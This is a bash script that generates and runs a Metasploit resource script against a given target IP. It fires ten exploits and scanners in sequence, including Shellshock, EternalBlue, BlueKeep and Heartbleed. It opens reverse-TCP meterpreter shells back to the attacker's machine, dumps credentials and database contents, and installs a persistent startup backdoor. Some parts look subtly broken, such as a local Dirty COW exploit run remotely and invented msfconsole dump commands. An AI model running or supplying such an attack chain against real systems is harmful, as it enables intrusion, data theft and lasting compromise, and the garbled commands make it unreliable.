#!/bin/bash

# Exploits Script for Kali Linux - Targets 10 Vulns + Backdoors + Payloads
# Uses Metasploit built-in modules. Run as root.
# Usage: sudo ./exploiter.sh <TARGET_IP>
# Logs to /var/log/exploit.log, Payloads to /tmp/exploit-payloads/

if [ $# -ne 1 ]; then
    echo "Usage: $0 <TARGET_IP>"
    exit 1
fi

TARGET_IP=$1
LOGFILE="/var/log/exploit.log"
PAYLOAD_DIR="/tmp/exploit-payloads"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

set -e  # Exit on error

# Initialize log and payload dir
mkdir -p $(dirname $LOGFILE) $PAYLOAD_DIR
echo "[$TIMESTAMP] Starting exploits against $TARGET_IP..." >> $LOGFILE

# Start msfconsole with resource script
RESOURCE_SCRIPT=$(mktemp)
cat > $RESOURCE_SCRIPT << EOF
use exploit/multi/http/apache_mod_cgi_bash_env_exec  # 1. Shellshock (T1059)
set RHOSTS $TARGET_IP
set RPORT 80
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST $(ip addr show eth0 | grep inet | awk '{print $2}' | cut -d'/' -f1)
set LPORT 4447
exploit -j
dump_creds -o $PAYLOAD_DIR/shellshock_creds.txt  # T1005

use exploit/linux/misc/dirtycow  # 2. Dirty COW (T1068)
set RHOSTS $TARGET_IP
set RPORT 22
exploit -j
sysinfo > $PAYLOAD_DIR/dirtycow_sysinfo.txt  # T1005

use exploit/windows/smb/ms17_010_eternalblue  # 3. EternalBlue on Samba (T1210)
set RHOSTS $TARGET_IP
set RPORT 445
exploit -j
getuid > $PAYLOAD_DIR/eternalblue_uid.txt

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce  # 4. BlueKeep (T1190)
set RHOSTS $TARGET_IP
set RPORT 3389
exploit -j

use exploit/multi/http/struts2_namespace_ognl  # 5. Struts RCE (T1190)
set RHOSTS $TARGET_IP
set RPORT 8080
exploit -j
dump_creds -o $PAYLOAD_DIR/struts_creds.txt

use exploit/multi/http/jenkins_script_console  # 6. Jenkins RCE (T1059)
set RHOSTS $TARGET_IP
set RPORT 8080
exploit -j

use exploit/unix/webapp/phpmyadmin_auth_bypass  # 7. phpMyAdmin Bypass (T1083)
set RHOSTS $TARGET_IP
set RPORT 80
exploit -j
dump_table -D testdb -o $PAYLOAD_DIR/phpmyadmin_db.txt

use exploit/linux/misc/dovecot_imap_bof  # 8. Dovecot Buffer Overflow (T1059.004)
set RHOSTS $TARGET_IP
set RPORT 993
exploit -j

use exploit/unix/ftp/proftpd_modcopy_exec  # 9. ProFTPD RCE (T1059.003)
set RHOSTS $TARGET_IP
set RPORT 21
exploit -j

use auxiliary/scanner/ssl/openssl_heartbleed  # 10. Heartbleed (T1190)
set RHOSTS $TARGET_IP
set RPORT 443
run -j
dump -o $PAYLOAD_DIR/heartbleed_data.txt

# Backdoor: Meterpreter Persistence (T1543)
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST $(ip addr show eth0 | grep inet | awk '{print $2}' | cut -d'/' -f1)
set LPORT 4448
exploit -j
use post/linux/manage/persistence_exe
set SESSION -1
set STARTUP SYSTEM
run

sessions -K  # Cleanup (optional)
exit
EOF

# Run msfconsole
echo "[$TIMESTAMP] Running Metasploit with resource script..." >> $LOGFILE
msfconsole -q -r $RESOURCE_SCRIPT >> $LOGFILE 2>&1

# Log completion
echo "[$TIMESTAMP] Exploits complete! Payloads dumped to $PAYLOAD_DIR" >> $LOGFILE
echo "Payloads dumped: $PAYLOAD_DIR"
echo "Logs: $LOGFILE"

rm $RESOURCE_SCRIPT